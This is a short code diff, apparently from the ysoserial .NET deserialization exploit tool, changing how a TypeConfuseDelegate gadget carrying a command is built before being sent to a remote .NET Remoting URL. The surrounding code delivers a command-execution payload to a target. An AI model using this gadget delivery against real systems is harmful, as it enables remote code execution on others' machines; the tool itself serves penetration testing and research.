@@ -71,7 +71,7 @@ namespace ysoserial.Plugins
                 if (secure) ChannelServices.RegisterChannel(new TcpChannel(), true);
 
                 Activator.GetObject(typeof(MarshalByRefObject), url)
-                    .Equals(new TypeConfuseDelegateGenerator().TypeConfuseDelegateGadget(command));
+                    .Equals(TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(command));
             }
             catch (Exception e)
             {
